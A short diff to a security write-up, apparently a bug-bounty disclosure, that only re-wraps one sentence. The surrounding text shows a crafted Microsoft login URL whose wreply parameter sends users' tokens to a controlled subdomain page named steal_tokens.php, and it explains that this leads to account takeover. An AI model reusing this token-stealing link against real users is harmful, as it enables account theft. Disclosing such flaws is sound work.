@@ -27,8 +27,7 @@ Since one of their subdomain was in my control, I could use the domain as a vali
 
 `https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1529775349&rver=6.7.6643.0&wp=MBI_SSL&wreply=https://success.office.com/steal_tokens.php&lc=1033&id=292666&lw=1&fl=easi2&pcexp=true&uictx=me`
 
-Basically, if any user who clicked on a crafted link with this changes, the tokens would get leaked and this token can be exchanged
-for a session token and subsequently an account takeover would result.
+Basically, if any user clicked on a crafted link with this changes, the tokens would get leaked and this token can be exchanged for a session token and subsequently an account takeover would result.
 
 
 <img src="http://139.59.39.57/images/outlook.jpg" />
